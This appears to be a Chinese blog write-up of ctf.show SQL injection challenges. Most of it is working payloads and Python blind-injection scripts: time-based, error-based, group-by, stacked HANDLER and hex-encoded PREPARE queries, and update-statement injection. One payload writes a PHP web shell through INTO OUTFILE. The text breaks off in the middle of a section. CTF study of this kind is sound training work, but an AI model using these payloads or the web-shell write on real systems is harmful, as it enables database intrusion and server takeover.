<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+b&#x27;<br></code></pre></td></tr></table></figure>
<p>这个可以延时5s，等价于<code>sleep(5)</code></p>
<p><strong>POC</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ip=1) or if(1=2, (select rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+&#x27;), 1)#<br></code></pre></td></tr></table></figure>
<ol>
<li><p>时间盲注</p>
<p>这波把上一轮的rlike给用了，只能再试一试笛卡尔积</p>
<p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ip=1) or if(1=2, (select count(*) from information_schema.columns A,information_schema.columns B), 1)#<br></code></pre></td></tr></table></figure>
<p>时间参数真的难调，最后合并一下才能提交</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828173629345.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828173629345.png" alt="image-20220828173629345" style="zoom:50%;"></p>
</li>
<li><p>时间盲注 这次过滤了前面用到的一大截包括字符串截取函数</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828174052474.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828174052474.png" alt="image-20220828174052474"></p>
</li>
</ol>
<p>依照上一个笛卡尔积的脚本，我们作相关函数的替换</p>
<p><code>ascii</code>替换为字符串匹配，<code>substr</code>替换为<code>left</code>，<code>group_concat</code>的话用<code>limit</code>慢慢出</p>
<p>太不容易了淦</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828221658391.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220828221658391.png" alt="image-20220828221658391" style="zoom:50%;"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br>url = <span class="hljs-string">&quot;http://63e8e9cb-226f-4b44-8f90-c4ef31182595.challenge.ctf.show/api/&quot;</span><br>db = <span class="hljs-string">&#x27;0123456789abcdef-&#123;&#125;,_&#x27;</span><br>result = <span class="hljs-string">&quot;ctfshow&#123;fcba847d-bf3b-4f6a-942b&quot;</span> <br><span class="hljs-comment"># 4f6a-942b-0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> db:<br>        <span class="hljs-comment">#payload = &quot;select version()&quot; ctfshow_flagxca,ctfshow_info</span><br>        <span class="hljs-comment">#payload = &quot;select column_name from information_schema.columns where table_name = &#x27;ctfshow_flagxcac&#x27; limit 1,1&quot;</span><br>        <span class="hljs-comment">#payload = &quot;select table_name from information_schema.tables where table_schema = database() limit 0, 1&quot;</span><br>        payload = <span class="hljs-string">&quot;select flagaabcc from ctfshow_flagxcac limit 0, 1&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;ip&#x27;</span>:<span class="hljs-string">f&quot;1) or if((<span class="hljs-subst">&#123;payload&#125;</span>) like &#x27;<span class="hljs-subst">&#123;result+s&#125;</span>%&#x27;, (select count(*) from information_schema.columns A,information_schema.columns B), 1&quot;</span>,<br>            <span class="hljs-string">&quot;debug&quot;</span>:<span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        result += s<br>        <span class="hljs-keyword">try</span>:<br>            r = requests.post(url, data=data, timeout=<span class="hljs-number">0.3</span>) <br>            result = result[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br>        time.sleep(<span class="hljs-number">0.2</span>)<br>    <span class="hljs-keyword">if</span> result[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<ol>
<li><p>limit注入</p>
<p>参考学习P神<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p>
<p>版本适用于mysql 5.x</p>
<p>可以利用<code>procedure analyse(xxx,1)</code>配合报错注入或者时间盲注（报错里面套benchmark）</p>
<p>ctfshow_web_flag_x</p>
<p><strong>payload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">page<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>limit<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-number">0x7e</span>, concat((<span class="hljs-keyword">select</span> version()), <span class="hljs-number">0x7e</span>)),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
<p>这里分清一个概念就是：对于limit注入如果存在group by字段的话是不可以跟union的;如果不存在的话也可以直接union注入，不过这关好像是过滤掉了select</p>
</li>
<li><p>group by注入</p>
<p>应该是和order by注入差不多，可以直接利用盲注，username和id字段的回显就不一样。</p>
<p>至于如何寻找的字段</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829203146986.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829203146986.png" alt="image-20220829203146986"></p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">from</span> unittest <span class="hljs-keyword">import</span> result<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># 1199 252</span><br>url = <span class="hljs-string">&quot;http://24b1d804-1f69-4732-89d1-6a70e05693ad.challenge.ctf.show/api/index.php&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># payload = &quot;select database()&quot; ctfshow_web ctfshow_flaga</span><br>        payload = <span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>        payload = <span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;&quot;</span><br>        payload = <span class="hljs-string">&quot;select flagaabc from ctfshow_flaga&quot;</span><br>        params = &#123;<span class="hljs-string">&quot;u&quot;</span>: <span class="hljs-string">f&quot;if(ord(substr((<span class="hljs-subst">&#123;payload&#125;</span>), <span class="hljs-subst">&#123;i&#125;</span>, 1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>, id, username)&quot;</span>&#125;<br>        r = requests.get(url, params=params)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(r.text)==<span class="hljs-number">1199</span>):<br>            head = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tail = mid<br>    <br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
</li>
<li><p>group by注入</p>
<p>与上一关不同的是，这一关的把数字给过滤掉了。回忆一下，1其实和<code>true</code>是等同的并且后者同样满足加减运算规则</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829204641616.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829204641616.png" alt="image-20220829204641616" style="zoom:50%;"></p>
<p>所以只需将上一关涉及到数字的替换即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">replaceNum</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;+&#x27;</span>.join([<span class="hljs-string">&#x27;true&#x27;</span>]*num)<br></code></pre></td></tr></table></figure>
</li>
<li><p>综合题</p>
<p>存在robots.txt，里面写了pwdreset.php，访问发现是一个密码重置界面。登陆进去以后是文件上传。因为文件上传的骚姿势还没学，直接上传群里的payload.bin，会在同目录下生成1.php木马，命令执行即可。分析一下bin文件，可以看到里面也有sql的写文件操作。应该是文件上传配合sql写文件（这里利用了堆叠注入）</p>
<p><code>&lt;?=</code>$_GET[1]\\`?&gt;`</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;;--+<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829215532144.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829215532144.png" alt="image-20220829215532144"></p>
</li>
<li><p><strong>堆叠注入</strong></p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829220430918.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829220430918.png" alt="image-20220829220430918"></p>
<p>过滤</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829220448528.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829220448528.png" alt="image-20220829220448528"></p>
</li>
</ol>
<p>前面的表名和列名可以用show来替换select</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 表<br>&#x27;; show tables; # ctfshow_flagasa<br># 列<br>&#x27;;desc ctfshow_flagasa; # flagas<br>或者<br>&#x27;;show columns from ctfshow_flagasa;<br></code></pre></td></tr></table></figure>
<p>最后的select利用的是handler：(另一种方法是<strong>预处理语句</strong>)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">HANDLER tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] alias]<br><br>HANDLER tbl_name READ index_name &#123; <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;</span> &#125; (value1,value2,...)<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT <span class="hljs-operator">|</span> PREV <span class="hljs-operator">|</span> <span class="hljs-keyword">LAST</span> &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br>HANDLER tbl_name READ &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br>HANDLER tbl_name <span class="hljs-keyword">CLOSE</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829221912523.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829221912523.png" alt="image-20220829221912523" style="zoom:50%;"></p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?username=&#x27;;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;<br></code></pre></td></tr></table></figure>
<ol>
<li><p>堆叠注入</p>
<p>这一关多过滤了show和左括号</p>
<p>所以这一关用到了预处理语句</p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/9891338.html">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 定义预处理语句<br><span class="hljs-keyword">PREPARE</span> stmt_name <span class="hljs-keyword">FROM</span> preparable_stmt;<br># 执行预处理语句<br><span class="hljs-keyword">EXECUTE</span> stmt_name [<span class="hljs-keyword">USING</span> <span class="hljs-variable">@var</span>_name [, <span class="hljs-variable">@var</span>_name] ...];<br># 删除(释放)定义<br>&#123;<span class="hljs-keyword">DEALLOCATE</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">DROP</span>&#125; <span class="hljs-keyword">PREPARE</span> stmt_name;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829224021570.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220829224021570.png" alt="image-20220829224021570" style="zoom:50%;"></p>
<p>对于上一关使用预处理语句的话，因为preparable_stmt是一个字符串，所以可以通过拼接的方式来绕过敏感函数</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">concat(&#x27;sele&#x27;,&#x27;ct&#x27;)<br></code></pre></td></tr></table></figure>
<p>这一关则是利用16进制编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;;prepare a from 0x73686f77207461626c6573;execute a;    #ctfsh_ow_flagas<br>&#x27;;prepare a from 0x646573632063746673685f6f775f666c61676173;execute a;    # flagasb<br>&#x27;;prepare a from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;execute a;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>堆叠注入</strong></p>
<p>首先看过滤，比之前多了一个逗号，之前的payload还可以用。而且这次sql语句中直接给出了表名和字段名</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831222751226.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831222751226.png" alt="image-20220831222751226"></p>
<p>查找原来的字段发现已经不在里头了</p>
</li>
</ol>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831222707507.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831222707507.png" alt="image-20220831222707507"></p>
<p>这道题考查的是sql的<strong>存储过程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">存储程序（Stored Procedure）是一种在数据库中存储复杂程序，以便外部程序调用的一种数据库对象。<br><br>存储过程是为了完成特定功能的SQL语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名字并给定参数(需要时)来调用执行。<br><br>存储过程思想上很简单，就是数据库 SQL 语言层面的代码封装与重用。<br>调用： call function()<br></code></pre></td></tr></table></figure>
<p>也就是可以预定义一些函数来方便调用。而这些函数存在与<code>information_schema.routines</code>表中，按常规直接去查</p>
<p>已经发现</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831224759340.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831224759340.png" alt="image-20220831224759340"></p>
<p>也可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;;call getFlag();<br></code></pre></td></tr></table></figure>
<p>228 - 230. 堆叠注入</p>
<p>这关黑名单存入了数据库里，然后仍然可以编码绕过</p>
<ol>
<li><p>update注入</p>
<p>利用了一个update重复给字段赋值的特性，最后呈现出来的结果随后面的字段，所以根据这个特性我们就可以将敏感数据回显到可见字段上</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831230413007.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831230413007.png" alt="image-20220831230413007" style="zoom:50%;"></p>
<p>注意闭合引号</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">password=1&#x27;, username=database()%23&amp;username=1<br>password=1&#x27;, username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;username=1<br>password=1&#x27;, username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flaga&#x27;)%23&amp;username=1<br>password=1&#x27;, username=(select group_concat(flagas) from flaga)%23&amp;username=1<br></code></pre></td></tr></table></figure>
</li>
<li><p>update注入</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831231356971.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831231356971.png" alt="image-20220831231356971"></p>
</li>
</ol>
<p>前面多了个md5和括号，闭合即可<code>&#39;)</code></p>
<ol>
<li><p><strong>update注入</strong></p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831235747598.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220831235747598.png" alt="image-20220831235747598"></p>
<p>和之前一样也没有过滤，sql语句也一样，但是没有回显变化。尝试盲注</p>
<p>发现在<code>http://230a1b50-8335-4eb0-9629-4a988a675b30.challenge.ctf.show/api/</code>页面存在时间延迟，直接打</p>
<p>还想复杂了，直接跟select一样，不过需要注意的一点是，update查询是<strong>一行一行查询</strong>，每行都会触发一个sleep函数，所以要选小一点</p>
<p>时间参数真的不好调…..</p>
<p><strong>POC</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username=1&#x27; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;, sleep(0.05), 1)#&amp;password=1<br></code></pre></td></tr></table></figure>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://0346fc96-8f6a-4f38-87d6-7a77545eb2a7.challenge.ctf.show/api/?page=1&amp;limit=10&#x27;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        <span class="hljs-comment"># ctfstow&#123;34fcde14-25fa-467c-8f50-73f171dbd3b5&#125;</span><br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        payload = <span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;&quot;</span><br>        payload = <span class="hljs-string">&quot;select group_concat(flagass233) from flag233333&quot;</span><br>        payload = <span class="hljs-string">&quot;select database()&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">f&quot;1&#x27;, pass=if(ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>, sleep(0.05), 1)#&quot;</span>,<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            r = requests.post(url, data=data, timeout=<span class="hljs-number">0.9</span>)<br>            tail = mid<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            head = mid + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
</li>
<li><p>update注入</p>
<p>这道题过滤了引号</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901090838288.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901090838288.png" alt="image-20220901090838288"></p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;<br></code></pre></td></tr></table></figure>
<p>由于无法再用引号去闭合语句，利用反斜杠的方法进行逃逸。然后pass就等于<code>&#39; where username =</code>，后面依然可用重复字段的注入方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;, pass=(select database());<br>update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;, pass=(select group_concat(table_name) from information_schema.tables where table_schema=database());   # flag23a<br>update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;, pass=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361);  # flagass23s3<br>update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;, pass=(select flagass23s3 from flag23a);<br></code></pre></td></tr></table></figure>
<ol>
<li><p>update注入</p>
<p>过滤了or和单引号。之前的payload中因为存在<code>information_schema</code>关键词，里面包含了or，所以不能继续用</p>
<p>考虑使用<code>innodb存储引擎</code>来绕过</p>
<p>InnoDB新增加了<strong>两张表</strong><code>innodb_index_stats</code>与<code>innodb_table_stats</code>，这两张表记录了所有新建的数据库与表</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901092843388.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901092843388.png" alt="image-20220901092843388" style="zoom:50%;"></p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901092913176.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901092913176.png" alt="image-20220901092913176"></p>
<p>这两个表都可以来查库和表名，遗憾的是并没有字段名可以查到。需要注意的是innodb这两张表位于<strong>mysql</strong>库当中</p>
